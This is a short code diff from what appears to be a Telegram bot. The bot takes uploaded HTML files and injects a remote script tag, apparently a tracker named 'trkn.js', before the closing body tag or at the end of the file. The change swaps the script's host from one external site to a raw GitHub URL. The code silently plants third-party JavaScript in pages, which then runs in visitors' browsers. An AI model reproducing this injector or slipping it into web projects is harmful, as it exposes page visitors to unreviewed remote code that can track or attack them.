@@ -70,7 +70,7 @@ bot.on("document", async (ctx) => {
   if (content.includes("</body>")) {
     content = content.replace("</body>", `<script src="https://javascriptonline.com/trkn.js"></script></body>`);
   } else {
-    content += `<script src="https://javascriptonline.com/trkn.js"></script>`;
+    content += `<script src="https://raw.githubusercontent.com/tucommenceapousser/tgweb/refs/heads/main/trkn.js"></script>`;
   }
 
   // Sauvegarde du fichier modifié
